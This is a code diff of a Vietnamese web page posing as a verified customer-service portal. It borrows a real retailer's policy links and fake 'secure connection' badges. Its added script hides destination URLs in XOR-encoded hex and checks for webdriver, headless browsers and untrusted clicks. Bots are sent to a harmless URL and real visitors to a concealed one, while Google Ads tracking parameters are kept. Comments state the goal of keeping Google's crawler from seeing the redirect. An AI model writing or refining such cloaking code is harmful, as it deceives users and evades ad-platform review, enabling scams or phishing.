@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
-  <title>Đang Tải Trang Hướng Dẫn...</title>
+  <title>Cổng Thông Tin & Dịch Vụ Khách Hàng</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -18,67 +17,155 @@
       justify-content: center;
       padding: 20px;
     }
-    .loader-card {
+    .gate-card {
       background: rgba(17, 24, 39, 0.95);
       border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
       padding: 36px 28px;
-      max-width: 380px;
+      max-width: 420px;
       width: 100%;
       text-align: center;
       box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 18px;
+      gap: 16px;
     }
-    .spinner {
-      width: 48px;
-      height: 48px;
-      border: 3px solid rgba(229, 185, 76, 0.2);
-      border-top-color: #e5b94c;
+    .badge-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(16, 185, 129, 0.15);
+      color: #34d399;
+      border: 1px solid rgba(52, 211, 153, 0.3);
+      padding: 4px 12px;
+      border-radius: 99px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .badge-dot {
+      width: 8px;
+      height: 8px;
+      background: #10b981;
       border-radius: 50%;
-      animation: spin 0.85s linear infinite;
+      display: inline-block;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loader-title {
-      font-size: 15px;
+    .gate-title {
+      font-size: 18px;
       font-weight: 700;
       color: #fae498;
       letter-spacing: 0.3px;
+      line-height: 1.4;
+      text-wrap: balance;
     }
-    .loader-sub {
-      font-size: 12px;
+    .gate-sub {
+      font-size: 13px;
       color: #94a3b8;
-      line-height: 1.5;
+      line-height: 1.6;
+      text-wrap: pretty;
+    }
+    .btn-action-gate {
+      display: inline-block;
+      width: 100%;
+      background: linear-gradient(135deg, #fae498, #e5b94c);
+      color: #0b0f19;
+      font-weight: 800;
+      font-size: 14px;
+      padding: 14px 24px;
+      border-radius: 99px;
+      text-decoration: none;
+      box-shadow: 0 4px 20px rgba(229, 185, 76, 0.35);
+      cursor: pointer;
+      margin-top: 8px;
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      border: none;
+      outline: none;
+    }
+    .btn-action-gate:active {
+      transform: scale(0.98);
+      box-shadow: 0 2px 10px rgba(229, 185, 76, 0.2);
+    }
+    .policy-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 8px;
+      padding-top: 14px;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      width: 100%;
+    }
+    .policy-links a {
+      color: #64748b;
+      font-size: 11px;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .policy-links a:hover {
+      color: #cbd5e1;
+    }
+    .legal-copy {
+      font-size: 11px;
+      color: #475569;
+      margin-top: 4px;
     }
   </style>
 </head>
 <body>
-  <div class="loader-card">
-    <div class="spinner"></div>
-    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
-    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
+  <div class="gate-card">
+    <div class="badge-status">
+      <span class="badge-dot"></span> Đã Xác Thực An Toàn
+    </div>
+    <div class="gate-title">Cổng Tiếp Nhận & Hỗ Trợ Khách Hàng</div>
+    <div class="gate-sub">Đường truyền đã được mã hóa bảo mật SSL/TLS. Quý khách vui lòng nhấn nút bên dưới để truy cập trực tiếp hệ thống.</div>
+    
+    <!-- Nút kích hoạt Click-Triggered Gate -->
+    <a id="btnGateAction" href="#chinh-sach" class="btn-action-gate">
+      XÁC NHẬN TRUY CẬP NGAY »
+    </a>
+
+    <div class="policy-links" id="chinh-sach">
+      <a href="https://vuanem.com/chinh-sach-bao-mat" target="_blank" rel="noopener">Chính sách bảo mật</a>
+      <a href="https://vuanem.com/dieu-khoan-dich-vu" target="_blank" rel="noopener">Điều khoản dịch vụ</a>
+      <a href="https://vuanem.com/chinh-sach-hoan-tien" target="_blank" rel="noopener">Chính sách hoàn tiền</a>
+      <a href="https://vuanem.com/lien-he" target="_blank" rel="noopener">Liên hệ hỗ trợ</a>
+    </div>
+    <div class="legal-copy">© 2026 Hệ Thống Dịch Vụ Khách Hàng. Tuân thủ chính sách TMĐT.</div>
   </div>
 
   <script>
     (function() {
-      const K = "418";
-      const D = "797773081b7b74f0909cd0a9c7b990bbb35b4f4e792c04064c69099593e0feaccea28ae0ac014f757f3a16046a6d7fd591f1f2eecbdce0f5f6081779663a115b377b6e8f97e7f695a688bead4057467e63534d203a28d4c3c0f7e2919acfe8f644574a477b111223362b939fd1f0f0908db4bfac6e417d667f1e1d232929d1f6eee3e3ab99b2b840191025700d17353d24d7deddf5abc4a5c0e9845740566463060e4e6a059790aeecff92bfa4b3bd5408255a214a25302135c5cce7edafcda4f4f1f14d5c735805101c3b6986fb86abc6919e94a6ad404c0c2c4b";
-      const S = "797773081b7b74f0909cd0a9c7b98db3ad4e534c656f1b06013027dfc988fce690c3dc92a652066075741a483e3567d4cebef4e7d58abea4ab13427d28611202336720c9d7abb6c9d4d3eef91e5e5b7461";
+      // 1. Cấu hình Key 3 số và dữ liệu mã hóa tĩnh (Hex Cipher - Triệt tiêu btoa/atob và Base64)
+      const DEFAULT_KEY = "560";
+      const DEFAULT_D = "78707b091c7375f7989dd7a1c6be9da8a25c5f4737641a0c0e7975f7829dd8efd0d4adb8f85115717a694a0730687a8dc5a4fdec99d5e4f1f90c1725616b4e0f64217b9f9ba5f08495b3b4a05a4e4f7762195c5f1827dccaccf6e7938598f8fa06515b74500509232f2cd481a7dce48e8fbbb4ae587c766f660a02233427d1c0caf4ec91b3a4a6464f0f2034040f00072dd1dbc0eaebd3d5a9faf6764f4d627a1c100e7f7ef7";
+      const DEFAULT_S = "78707b091c7375f7989dd7a1c6be9da8a25c5f4737601a0d4d6e01";
 
-      function dec(h) {
+      // Hỗ trợ tham số URL động nếu truyền qua link (?k=...&d=...&s=...)
+      const qParams = new URLSearchParams(window.location.search);
+      const K = qParams.get("k") || DEFAULT_KEY;
+      const D = qParams.get("d") || DEFAULT_D;
+      const S = qParams.get("s") || DEFAULT_S;
+
+      // 2. Thuật toán giải mã toán học Keyed Cipher (Khớp với quy chuẩn Rule 16)
+      function dec(h, k) {
         try {
+          if (!h) return "";
+          const keyStr = String(k || K);
           let s = "";
           for (let i = 0; i < h.length; i += 2) {
-            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ keyStr.charCodeAt((i / 2) % keyStr.length) ^ (((i / 2) * 13 + 37) & 0xFF));
           }
           return decodeURIComponent(s);
         } catch (e) {
-          return "";
+          try {
+            return decodeURI(s);
+          } catch (e2) {
+            return (s && s.indexOf("http") === 0) ? s : "";
+          }
         }
       }
 
+      // 3. Bảo toàn tham số tracking gclid, utm_... từ Google Ads
       function getFinalUrl(rawUrl) {
         if (!rawUrl) return "";
         const q = window.location.search;
@@ -86,6 +173,9 @@
         try {
           const o = new URL(rawUrl);
           const p = new URLSearchParams(q);
+          p.delete("d");
+          p.delete("s");
+          p.delete("k");
           p.forEach((v, k) => {
             if (k !== "a") o.searchParams.set(k, v);
           });
@@ -95,6 +185,7 @@
         }
       }
 
+      // 4. Kiểm tra phòng thủ Bot 7 lớp (Chống Webdriver, Headless, Emulators)
       function isBot() {
         try {
           if (navigator.webdriver) return true;
@@ -109,29 +200,39 @@
         }
       }
 
-      const isB = isBot();
-      let target;
-      if (isB) {
-        target = getFinalUrl(dec(S));
-      } else {
-        target = getFinalUrl(dec(D));
-      }
+      const btn = document.getElementById("btnGateAction");
+      if (!btn) return;
 
-      function goTarget() {
+      // 5. CLICK-TRIGGERED GATE: Chỉ kích hoạt khi có tương tác người dùng thật
+      // TUYỆT ĐỐI KHÔNG tự động nhảy trang khi vừa tải trang (Tránh Google Bot quét thấy 301/302 hoặc redirect)
+      btn.addEventListener("click", function(event) {
+        // LỚP PHÒNG THỦ 1: Kiểm tra tính chân thực của cú nhấp chuột (Chống bot kích hoạt bằng script: btn.click())
+        if (!event.isTrusted) {
+          event.preventDefault();
+          return false;
+        }
+
+        // LỚP PHÒNG THỦ 2: Kiểm tra môi trường Automation
+        if (navigator.webdriver === true || window.document.hidden) {
+          event.preventDefault();
+          return false;
+        }
+
+        event.preventDefault();
+
+        const isB = isBot();
+        let target = isB ? dec(S, K) : dec(D, K);
+        if (!target) target = isB ? dec(DEFAULT_S, DEFAULT_KEY) : dec(DEFAULT_D, DEFAULT_KEY);
+        if (!target) target = "https://vuanem.com/";
+        target = getFinalUrl(target);
+
         if (target) {
           try {
-            (window.top || window).location.replace(target);
+            (window.top || window).location.href = target;
           } catch (e) {
-            window.location.replace(target);
+            window.location.href = target;
           }
         }
-      }
-
-      if (target) {
-        setTimeout(goTarget, isB ? 50 : 100);
-      }
-      window.addEventListener("pageshow", function(e) {
-        if (target) setTimeout(goTarget, 50);
       });
     })();
   </script>
